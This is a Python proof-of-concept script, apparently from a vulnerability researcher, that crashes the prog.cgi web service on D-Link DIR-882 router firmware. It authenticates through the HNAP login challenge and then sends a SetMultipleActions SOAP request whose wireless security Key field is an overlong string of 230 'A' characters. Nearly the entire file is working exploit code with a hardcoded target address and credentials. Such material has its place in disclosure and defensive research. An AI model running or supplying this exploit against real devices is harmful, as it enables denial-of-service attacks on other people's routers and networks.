#!/usr/bin/env python3

# dos_prog_cgi_dir882.py
# 
# Description: Sending a payload of a specific length causes the prog.cgi
# process to crash(the pid changes).
# 
# Firmware: DIR882A1_FW1.30B06fix03_220628
# Binary: /bin/prog.cgi
# SOAP Action: SetMultipleActions/SetWLanRadioSecurity
# Location in code: sub_446E2C
#
# Written by: ChinaNuke <ChinaNuke@nuke666.cn>
# Last updated on: 2022/11/16

import math
import re
import time
from hashlib import md5

import requests

IP = '192.168.0.1'
USERNAME = 'Admin'
PASSWORD = 'dir882$$'
REPEAT_TIMES = 1

trans_5C = bytes((x ^ 0x5c) for x in range(256))
trans_36 = bytes((x ^ 0x36) for x in range(256))
blocksize = md5().block_size

# Login logic copied from
# https://github.com/pr0v3rbs/CVE/blob/master/CVE-2018-19986%20-%2019990/poc.py


def hmac_md5(key, msg):
    key, msg = key.encode(), msg.encode()
    if len(key) > blocksize:
        key = md5(key).digest()
    key += b'\x00' * (blocksize - len(key))  # padding
    o_key_pad = key.translate(trans_5C)
    i_key_pad = key.translate(trans_36)
    return md5(o_key_pad + md5(i_key_pad + msg).digest())


def hnap_auth(soap_action, private_key):
    b = math.floor(int(time.time())) % 2000000000
    b = str(b)[:-2]
    h = hmac_md5(private_key, b + '"http://purenetworks.com/HNAP1/' +
                 soap_action + '"').hexdigest().upper()
    return h + " " + b


for i in range(REPEAT_TIMES):
    # ---------
    #   Login
    # ---------

    # Note: the double quotations in SOAPAction cannot be omitted.
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36',
        'Content-Type': 'text/xml; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'SOAPAction': '"http://purenetworks.com/HNAP1/Login"'
    }

    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>{USERNAME}</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'

    r = requests.post(f'http://{IP}', data=payload, headers=headers)
    # print(r.text)

    challenge = re.search(r'<Challenge>(.*?)</Challenge>', r.text).group(1)
    cookie = re.search(r'<Cookie>(.*?)</Cookie>', r.text).group(1)
    publick_key = re.search(r'<PublicKey>(.*?)</PublicKey>', r.text).group(1)

    # print(f'challenge: {challenge}')
    # print(f'cookie: {cookie}')
    # print(f'publick_key: {publick_key}')

    private_key = hmac_md5(publick_key + PASSWORD,
                           challenge).hexdigest().upper()
    password = hmac_md5(private_key, challenge).hexdigest().upper()

    headers['HNAP_AUTH'] = hnap_auth("Login", private_key)
    headers['Cookie'] = f'uid={cookie}'
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>login</Action><Username>{USERNAME}</Username><LoginPassword>{password}</LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'

    r = requests.post(f'http://{IP}/HNAP1/', data=payload, headers=headers)
    if '<LoginResult>success</LoginResult>' in r.text:
        print('[*] Login successfully!')
    else:
        print('[!] Login failed!')

    # -----------------------------
    #   Trigger the vulnerability
    # -----------------------------

    # A string of even-length between 200 and 256 will cause the prog.cgi 
    # to crash.
    
    key = 'A' * 230
    payload = f'''<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetMultipleActions xmlns="http://purenetworks.com/HNAP1/"><SetSmartconnectSettings xmlns="http://purenetworks.com/HNAP1/"><Enabled>true</Enabled></SetSmartconnectSettings><SetWLanRadioSettings xmlns="http://purenetworks.com/HNAP1/"><RadioID>RADIO_2.4GHz</RadioID><Enabled>true</Enabled><Mode>802.11bgn</Mode><SSID>dir882</SSID><SSIDBroadcast>true</SSIDBroadcast><ChannelWidth>0</ChannelWidth><Channel>0</Channel><SecondaryChannel>0</SecondaryChannel><QoS>true</QoS><ScheduleName>Always</ScheduleName><TXPower>75</TXPower><Coexistence>true</Coexistence><MUMIMOEnabled>true</MUMIMOEnabled><BandSteeringEnabled>true</BandSteeringEnabled><AirTimeFairnessEnabled>true</AirTimeFairnessEnabled></SetWLanRadioSettings><SetWLanRadioSecurity xmlns="http://purenetworks.com/HNAP1/"><RadioID>RADIO_2.4GHz</RadioID><Enabled>true</Enabled><Type>WPA2-PSK</Type><Encryption>AES</Encryption><KeyRenewal>3600</KeyRenewal><RadiusIP1></RadiusIP1><RadiusPort1></RadiusPort1><RadiusSecret1></RadiusSecret1><RadiusIP2></RadiusIP2><RadiusPort2></RadiusPort2><RadiusSecret2></RadiusSecret2><Key>{key}</Key></SetWLanRadioSecurity><SetWLanRadioSettings xmlns="http://purenetworks.com/HNAP1/"><RadioID>RADIO_5GHz</RadioID><Enabled>true</Enabled><Mode>802.11anac</Mode><SSID>dir882</SSID><SSIDBroadcast>true</SSIDBroadcast><ChannelWidth>1</ChannelWidth><Channel>0</Channel><SecondaryChannel>0</SecondaryChannel><QoS>true</QoS><ScheduleName>Always</ScheduleName><TXPower>100</TXPower><Coexistence>false</Coexistence><MUMIMOEnabled>true</MUMIMOEnabled><BandSteeringEnabled>true</BandSteeringEnabled><AirTimeFairnessEnabled>true</AirTimeFairnessEnabled></SetWLanRadioSettings><SetWLanRadioSecurity xmlns="http://purenetworks.com/HNAP1/"><RadioID>RADIO_5GHz</RadioID><Enabled>true</Enabled><Type>WPA2-PSK</Type><Encryption>AES</Encryption><KeyRenewal>3600</KeyRenewal><RadiusIP1></RadiusIP1><RadiusPort1></RadiusPort1><RadiusSecret1></RadiusSecret1><RadiusIP2></RadiusIP2><RadiusPort2></RadiusPort2><RadiusSecret2></RadiusSecret2><Key>27fbcc69c5bbcb4f8fb2a12a575e0490cbd1cc6975bbcbac8fb2ecc857bffa90cbd1cc6975bbcbac8fb2ecc857bffa90cbd1cc6975bbcbac8fb2ecc857bffa90</Key></SetWLanRadioSecurity><SetWPSSettings xmlns="http://purenetworks.com/HNAP1/"><WPSPBC>true</WPSPBC><WPSPIN>false</WPSPIN></SetWPSSettings></SetMultipleActions></soap:Body></soap:Envelope>'''
    headers['SOAPAction'] = '"http://purenetworks.com/HNAP1/SetMultipleActions"'
    headers['HNAP_AUTH'] = hnap_auth("SetMultipleActions", private_key)
    r = requests.post(f'http://{IP}/HNAP1/', data=payload, headers=headers)
    print(r.text)

    # if REPEAT_TIMES > 1:
    #     time.sleep(1)
